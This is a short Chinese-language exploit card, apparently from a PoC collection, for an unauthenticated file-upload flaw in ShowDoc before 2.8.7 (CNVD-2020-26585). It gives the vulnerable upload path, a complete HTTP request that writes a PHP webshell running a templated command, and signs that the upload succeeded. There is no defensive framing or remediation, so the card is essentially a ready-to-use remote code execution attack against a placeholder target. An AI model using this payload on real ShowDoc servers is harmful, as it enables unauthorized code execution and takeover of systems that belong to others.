# ShowDoc 任意文件上传 RCE (CNVD-2020-26585)

## 指纹特征
- 服务: ShowDoc < 2.8.7
- 端口: 8080 (默认)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 未授权文件上传 | `/index.php?s=/home/page/uploadImg` | 无 |

## PoC 指令

通过未授权上传图片接口写入恶意 PHP 文件：

```http
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="editormd-image-file"; filename="test.php"
Content-Type: text/plain

<?php echo shell_exec("{{COMMAND}}"); ?>
------Boundary--
```

## Success Signal
- **状态验证**: 接口响应中包含文件存储路径 (如 `/Public/Uploads/test.php`)。
- **物理验证**: 成功在目标系统写入并执行 PHP WebShell。
